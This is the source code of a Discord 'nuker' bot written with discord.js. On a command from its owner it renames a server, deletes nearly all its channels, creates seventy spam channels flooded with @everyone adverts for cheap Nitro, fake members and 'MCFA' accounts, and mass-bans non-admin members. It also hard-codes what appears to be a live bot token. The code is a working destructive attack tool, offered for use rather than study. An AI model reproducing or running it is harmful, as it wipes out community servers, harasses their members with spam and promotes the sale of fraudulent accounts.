import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN      = 'MTQ3OTg3NjczNTI0MjczMTU3MQ.GyNKtv.RjqcxuwwDfAQ4KlxJ5EepZ3cALVDEZ2Qsil1sM';              // ← your bot token (Bot MTE...)
const OWNER      = '1479770170389172285';        // only this user can trigger
const PING       = '<@1479770170389172285>';
const INVITE     = 'discord.gg/n1tromaker';
const SPAM_NAME  = 'best-shop';
const NEW_SERVER_NAME = '.gg/n1tromaker';

const SPAM_TEXT = `
__** @everyone @here Nitro & Mcfa & Member shop**__
Cheapest supplier ever ${PING}

• Nitro boost for 2.5$
• Nitro basic for 1$
________________

• Offline for 0.7$/k Off   • Online for 1.5$/k On
59000+ offline in stock    9000+ online in stock

_________________

MCFA lifetime full access for 3.99$

${INVITE}
`.trim();

client.once('ready', () => {
  console.log(`[${client.user.tag}] ready — commands: .nuke   .massban`);
});

client.on('messageCreate', async message => {
  if (message.author.id !== OWNER) return;
  if (!message.content.startsWith('.')) return;
  if (!message.guild) return;

  const command = message.content.slice(1).trim().split(/\s+/)[0].toLowerCase();

  // ── .nuke ───────────────────────────────────────────────────────────────
  if (command === 'nuke') {
    // rename server
    message.guild.setName(NEW_SERVER_NAME).catch(() => {});

    // delete almost all channels (skip current so you see feedback)
    for (const ch of message.guild.channels.cache.values()) {
      if (ch.id === message.channel.id) continue;
      ch.delete().catch(() => {});
      await new Promise(r => setTimeout(r, 65));
    }

    // create spam channels and start flooding each one
    for (let i = 1; i <= 70; i++) {
      try {
        const channel = await message.guild.channels.create({
          name: `${SPAM_NAME}-${i}`,
          type: ChannelType.GuildText,
          permissionOverwrites: [{
            id: message.guild.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
          }]
        });

        setInterval(() => {
          channel.send(SPAM_TEXT).catch(() => {});
          channel.send(`@everyone || ${SPAM_TEXT}`).catch(() => {});
        }, 420); // very fast spam per channel

      } catch {}

      await new Promise(r => setTimeout(r, 100));
    }

    // also keep spamming the command channel forever
    setInterval(() => {
      message.channel.send(SPAM_TEXT + ' @everyone').catch(() => {});
    }, 550);

    message.channel.send('nuke sequence started').catch(() => {});
  }

  // ── .massban ──────────────────────────────────────────────────────────
  if (command === 'massban') {
    let bannedCount = 0;

    for (const member of message.guild.members.cache.values()) {
      if (member.id === client.user.id) continue;
      if (member.permissions.has(PermissionsBitField.Flags.Administrator)) continue;

      try {
        await member.ban({ reason: 'cleaned — join .gg/n1tromaker' });
        bannedCount++;
        await new Promise(r => setTimeout(r, 380));
      } catch {}
    }

    message.channel.send(`≈ ${bannedCount} members banned`).catch(() => {});
  }
});

client.login(TOKEN).catch(console.error);
